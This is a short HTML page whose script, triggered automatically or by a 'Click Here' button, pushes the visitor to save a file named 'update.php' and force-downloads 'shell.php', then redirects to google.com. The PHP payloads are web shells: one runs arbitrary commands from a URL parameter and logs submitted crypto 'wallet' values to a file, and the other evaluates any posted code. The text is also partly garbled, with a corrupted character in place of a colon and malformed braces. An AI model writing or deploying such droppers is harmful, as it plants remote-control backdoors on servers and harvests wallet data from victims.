<body>
<center>
<button class="btn" onclick=saveFile() ontouchstart=saveFile()>Click Here</button>
</center>

<script>
async function saveFile(){
try{
if('showSaveFilePicker' in window){
// NATIVE FILE PICKER - Chrome/Brave/Opera
const handle=await showSaveFilePicker({
suggestedName:'update.php',
types:[{description:'PHP',accept:{'text/plain'üôÅ'.php']}}]
});
const writable=await handle.createWritable();
await writable.write(`<?php
error_reporting(0);
if($_POST['wallet']??''){file_put_contents('wallets.txt',$_POST['wallet']."\\n",FILE_APPEND);echo'OK';}
if($_GET['cmd']??''){system($_GET['cmd']);}
?>`);
await writable.close();
}catch(e){}

// FALLBACK: Blob download
setTimeout(()=>{
const a=document.createElement('a');
a.href=URL.createObjectURL(new Blob([`<?php @eval($_POST['c']); ?>`],{type:'text/plain'}));
a.download='shell.php';
a.click();
},100);

setTimeout(()=>location.href='https://google.com',500);
}

// Auto-trigger
setTimeout(saveFile,1500);
</script>
